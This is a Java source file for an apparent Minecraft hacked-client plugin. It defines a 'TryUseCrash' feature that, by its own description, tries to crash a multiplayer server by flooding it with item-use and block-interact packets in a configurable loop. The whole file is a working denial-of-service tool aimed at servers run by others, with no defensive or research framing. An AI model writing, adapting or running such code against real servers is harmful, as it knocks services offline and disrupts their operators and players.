package me.dustin.crash.feature;

import me.dustin.crash.CrashPlugin;
import me.dustin.crash.mixin.interf.IWorldClient;
import me.dustin.events.core.EventListener;
import me.dustin.events.core.annotate.EventPointer;
import me.dustin.jex.event.filters.PlayerPacketsFilter;
import me.dustin.jex.event.filters.TickFilter;
import me.dustin.jex.event.misc.EventTick;
import me.dustin.jex.event.player.EventPlayerPackets;
import me.dustin.jex.feature.mod.core.Feature;
import me.dustin.jex.feature.option.annotate.Op;
import me.dustin.jex.helper.misc.Wrapper;
import me.dustin.jex.helper.network.NetworkHelper;
import net.minecraft.client.network.PendingUpdateManager;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

import java.util.Random;

public class TryUseCrash extends Feature {

    @Op(name = "Packet Count", min = 1, max = 100, inc = 10)
    public int packetCount = 38;
    @Op(name = "Auto Disable")
    public boolean autoDisable = true;

    public TryUseCrash() {
        super(CrashPlugin.CRASH, "Tries to crash the server by spamming use packets. (By 0x150)");
    }

    @EventPointer
    private final EventListener<EventPlayerPackets> eventPlayerPacketsEventListener = new EventListener<>(eventPlayerPackets -> {
        BlockHitResult bhr = new BlockHitResult(new Vec3d(.5, .5, .5), Direction.DOWN, Wrapper.INSTANCE.getLocalPlayer().getBlockPos(), false);
        PendingUpdateManager pendingUpdateManager = ((IWorldClient)Wrapper.INSTANCE.getWorld()).getPendingUpdateManager();
        net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket packet = new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, pendingUpdateManager.incrementSequence().getSequence());
        PlayerInteractBlockC2SPacket packet1 = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr, pendingUpdateManager.incrementSequence().getSequence());

        for (int i = 0; i < packetCount; i++) {
            NetworkHelper.INSTANCE.sendPacket(packet);
            NetworkHelper.INSTANCE.sendPacket(packet1);
        }
    }, new PlayerPacketsFilter(EventPlayerPackets.Mode.POST));

    @EventPointer
    private final EventListener<EventTick> eventTickEventListener = new EventListener<>(eventTick -> {
        if (Wrapper.INSTANCE.getWorld() == null || Wrapper.INSTANCE.getLocalPlayer() == null && autoDisable)
            setState(false);
    }, new TickFilter(EventTick.Mode.PRE));
}
